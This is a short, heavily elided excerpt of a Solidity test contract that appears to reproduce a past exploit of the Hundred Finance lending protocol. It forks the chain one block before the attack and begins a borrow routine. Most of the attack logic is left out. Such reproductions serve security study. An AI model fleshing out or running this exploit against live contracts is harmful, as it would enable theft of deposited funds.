...
contract Exploit_HundredFinance is TestHarness {
    ...
    IUniswapV2Pair private constant pairUsdcWxdai =
        IUniswapV2Pair(0xA227c72a4055A9DC949cAE24f54535fe890d3663);

    uint256 amountBorrowed;
    uint16 timesBorrowed;

    function setUp() external {
        cheat.createSelectFork(vm.envString("RPC_URL"), 21_120_319); // We pin one block before the exploit
        // happened.
    }
    ...
    function borrowXDAI() public {
        ...
        uint256 amount = ((amountBorrowed * 1e12) * 60) / 100;
